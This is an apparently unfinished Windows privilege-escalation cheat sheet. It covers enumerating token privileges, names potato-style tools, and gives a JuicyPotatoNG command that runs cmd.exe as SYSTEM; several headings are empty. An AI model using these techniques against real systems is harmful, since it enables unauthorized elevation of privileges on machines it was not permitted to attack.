# Enumeration 
```
whoami /priv
```
# SeDebugPrivilege 
What it does: Grants users critical access to system components and can be utilized for remote command execution 
# SeTakeOwnership
What it does: Lets you take ownership of certain files 
# SeImpersonatePrivilege
What it does: Lets you impersonate system user 
## Common tools: 
### JuicypotatoNG

```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```

### RogueWinRM
### Sweet Potato
### PrintSpoofer
# SeLoadDriverPrivilege

# SeBackupPrivilege
